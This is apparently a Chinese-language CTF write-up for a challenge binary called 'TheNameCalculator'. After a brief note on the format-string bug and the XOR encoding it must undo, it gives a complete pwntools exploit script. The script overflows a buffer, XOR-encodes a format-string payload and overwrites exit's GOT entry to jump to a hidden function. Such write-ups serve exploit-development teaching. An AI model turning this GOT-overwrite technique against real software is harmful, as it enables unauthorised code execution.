### 漏洞分析

又是格式化字符串漏洞，最后覆盖了exit函数的got表。

中间有个xor编码的过程，需要写个对应的解码（与编码一样流程）

### 利用代码

```python
#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from pwn import *
import itertools

# IP = "chal.noxale.com"
# PORT = 5678
IP = "127.0.0.1"
PORT = 9999

context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h']
# context(os='linux',arch='amd64')
mode = args['MODE'].lower()
binary = "./TheNameCalculator"

# code = context.binary = ELF(binary)
# if args['LIBDEBUG']:
#     os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits)
# if args['LIBC']:
#     os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC'])
# libc = code.libc
# libc.symbols['main_arena'] = libc.symbols['__malloc_hook'] + 0x10
# libc.symbols['one_gadget'] = 0xf1147

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))

if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
    # io.recvuntil('sha256(xxxx+')
    # suffix = io.recvuntil(')', drop=True)
    # io.recvuntil('== ')
    # hash_str = io.recvline(keepends=False)
    # io.sendline(iters.bruteforce(lambda x: sha256sumhex(
            # x + suffix) == hash_str, string.printable[:62], 4, 'fixed'))
else:
    io = process(binary)

rand = 111458341

print io.recvline()

payload1 = "A"*0x1c + p32(rand)

gdb.attach(io, '''
b *0x08048625
b *0x080486D5
b *0x080487C2
c
'''
)

io.send(payload1)
io.recvline()

the_exit = 0x0804A024
supersecret = 0x08048596

def encode(payload):
    xor_chr = 0x5F7B4153
    if len(payload) % 4 != 0:
        print "Payload is not the multiple 4!"
        exit(0)
    result = ""
    for i in range(0, 24, 1):
        res = ""
        orig = u32(payload[i:i+4])
        res = p32(orig ^ xor_chr)
        payload = payload[0:i] + res + payload[i+4:]
    # print payload
    return payload
        
# payload2_orig = ("AAAA" + "%12$x."*3).ljust(28, "\x00")
payload2_orig = p32(0x0804A024) + "%34194c" + "%12$hn"
payload2_orig = payload2_orig.ljust(28, "\x00")

payload2 = encode(payload2_orig)
io.send(payload2)

io.interactive()

```